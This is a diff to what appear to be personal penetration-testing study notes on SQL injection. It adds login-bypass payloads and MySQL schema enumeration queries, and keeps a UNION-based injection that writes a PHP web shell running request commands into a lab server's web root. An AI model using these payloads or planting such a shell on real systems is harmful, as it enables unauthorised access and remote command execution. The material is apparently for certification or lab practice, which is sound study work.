@@ -100,7 +100,11 @@ Using sqlmap with login-page
 try single quote, then double quote, then try with comments     
 Comment chars    
 
-    ' " % %% -- /* // ) ;   
+    ' " % %% -- /* */ // ) ;   
+Bypassing login:   
+    password' or 1=1;--   
+    ' or 1--  
+    ' or true;--    
 Testing Payloads    
 
     'or 1=1- -
@@ -159,13 +163,16 @@ https://sushant747.gitbooks.io/total-oscp-guide/sql-injections.html
 
 Figuring out schema   
 MySQL:   
+```
 Databases: SELECT schema_name FROM information_schema.schemata   
 Tables: SELECT table_name FROM information_schema.tables   
 Columns: SELECT column_name FROM information_schema.columns   
-#enum info
+```
+enum info
+```
 text UNION SELECT 1,@@version,user(),system_user(),database(),3,4,5,6,8,10,11
 user() - username and hostname of account, system_user() - account name used by Windows auth     
-
+```
 
 MS SQL Server:   
 Note: information_schema can be used for MS SQL Server as well, with some slight, but significant, differences. The queries will need to explicitly reference individual databases because information_schema is a view that provides only info on the current database. Databases: SELECT name FROM sys.databases   
@@ -193,4 +200,8 @@ Example SQLi on Windows:
 
 #exploitation
 
-    http://10.10.10.10/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
+    http://10.10.10.10/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'    
+
+
+More payloads:    
+https://github.com/payloadbox/sql-injection-payload-list   
